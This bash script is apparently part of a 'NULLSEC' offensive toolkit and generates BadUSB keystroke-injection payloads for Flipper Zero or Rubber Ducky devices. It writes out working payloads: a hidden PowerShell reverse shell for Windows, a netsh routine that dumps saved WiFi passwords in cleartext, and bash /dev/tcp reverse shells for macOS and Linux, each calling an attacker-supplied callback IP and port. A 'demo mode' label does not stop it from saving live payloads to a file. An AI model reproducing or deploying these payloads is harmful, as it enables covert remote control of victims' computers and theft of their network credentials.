#!/bin/bash
# NULLSEC BadUSB Attack - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'; MAGENTA='\033[1;35m'

clear
echo -e "${RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓${RESET}"
echo -e "${RED}█${RESET}              ${WHITE}💾  NULLSEC BADUSB ATTACK  💾${RESET}"
echo -e "${RED}█${RESET}                  ${CYAN}[ bad-antics development ]${RESET}"
echo -e "${RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓${RESET}"
echo ""

echo -e "${CYAN}╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸${RESET}"
echo -e "${CYAN}${RESET}  ${WHITE}BADUSB CONFIGURATION${RESET}                                                 ${CYAN}${RESET}"
echo -e "${CYAN}╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸${RESET}"
echo ""

echo -e "  ${YELLOW}Target OS:${RESET}"
echo -e "    ${DIM}1) Windows${RESET}"
echo -e "    ${DIM}2) macOS${RESET}"
echo -e "    ${DIM}3) Linux${RESET}"
read -p "$(echo -e ${WHITE}'  [>] Select OS [1-3]: '${RESET})" TARGET_OS
[ -z "$TARGET_OS" ] && TARGET_OS="1"

echo ""
echo -e "  ${YELLOW}Payload type:${RESET}"
echo -e "    ${DIM}1) Reverse shell${RESET}"
echo -e "    ${DIM}2) Credential stealer${RESET}"
echo -e "    ${DIM}3) WiFi password extractor${RESET}"
echo -e "    ${DIM}4) System info gather${RESET}"
echo -e "    ${DIM}5) Custom script${RESET}"
read -p "$(echo -e ${WHITE}'  [>] Select payload [1-5]: '${RESET})" PAYLOAD_TYPE
[ -z "$PAYLOAD_TYPE" ] && PAYLOAD_TYPE="1"

if [ "$PAYLOAD_TYPE" = "1" ]; then
    read -p "$(echo -e ${WHITE}'  [>] Callback IP: '${RESET})" CALLBACK_IP
    [ -z "$CALLBACK_IP" ] && CALLBACK_IP="192.168.1.100"
    read -p "$(echo -e ${WHITE}'  [>] Callback port: '${RESET})" CALLBACK_PORT
    [ -z "$CALLBACK_PORT" ] && CALLBACK_PORT="4444"
fi

if [ "$PAYLOAD_TYPE" = "5" ]; then
    read -p "$(echo -e ${WHITE}'  [>] Custom command: '${RESET})" CUSTOM_CMD
fi

read -p "$(echo -e ${WHITE}'  [>] Output file (for Flipper/Rubber Ducky): '${RESET})" OUTPUT_FILE
[ -z "$OUTPUT_FILE" ] && OUTPUT_FILE="/tmp/payload.txt"

echo ""
read -p "$(echo -e ${YELLOW}'  [!] Demo mode? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}  BADUSB PAYLOAD GENERATION${RESET}"
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

os_names=("Windows" "macOS" "Linux")
OS_NAME=${os_names[$((TARGET_OS-1))]}

if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Generating BadUSB payload for $OS_NAME"
    echo ""
    
    echo -e "${DIM}[*] Generating DuckyScript payload...${RESET}"
    sleep 0.5
    
    case $TARGET_OS in
        1) # Windows
            case $PAYLOAD_TYPE in
                1)
                    SCRIPT="DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c \"\$c=New-Object Net.Sockets.TCPClient('$CALLBACK_IP',$CALLBACK_PORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$o=(iex \$d 2>&1|Out-String);\$r=\$o+\"PS \"+(pwd).Path+\"> \";\$sb=([text.encoding]::ASCII).GetBytes(\$r);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()\"
ENTER"
                    ;;
                3)
                    SCRIPT="DELAY 1000
GUI r
DELAY 500
STRING cmd /c \"netsh wlan show profiles\" | findstr \"All User Profile\" > %TEMP%\\wifi.txt && for /f \"tokens=2 delims=:\" %a in (%TEMP%\\wifi.txt) do netsh wlan show profile name=%a key=clear
ENTER"
                    ;;
            esac
            ;;
        2) # macOS
            SCRIPT="DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 500
STRING bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1
ENTER"
            ;;
        3) # Linux
            SCRIPT="DELAY 1000
ALT F2
DELAY 500
STRING gnome-terminal
ENTER
DELAY 500
STRING bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1
ENTER"
            ;;
    esac
    
    echo ""
    echo -e "${WHITE}━━━ GENERATED PAYLOAD ━━━${RESET}"
    echo -e "${DIM}$SCRIPT${RESET}"
    echo ""
    
    echo "$SCRIPT" > "$OUTPUT_FILE" 2>/dev/null
    echo -e "${GREEN}[+]${RESET} Payload saved to: $OUTPUT_FILE"
    
    echo ""
    echo -e "${GREEN}[✓]${RESET} SIMULATION - Payload generated (not executed)"
else
    echo -e "${RED}[*]${RESET}"
    echo -e "${YELLOW}[*] Use Flipper Zero or USB Rubber Ducky to deploy${RESET}"
    echo -e "${DIM}    Upload the generated payload to your device${RESET}"
fi

echo ""
echo -e "${GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓${RESET}"
echo -e "${GREEN}█${RESET}  ${WHITE}PAYLOAD GENERATED${RESET}                                                    ${GREEN}█${RESET}"
echo -e "${GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓${RESET}"
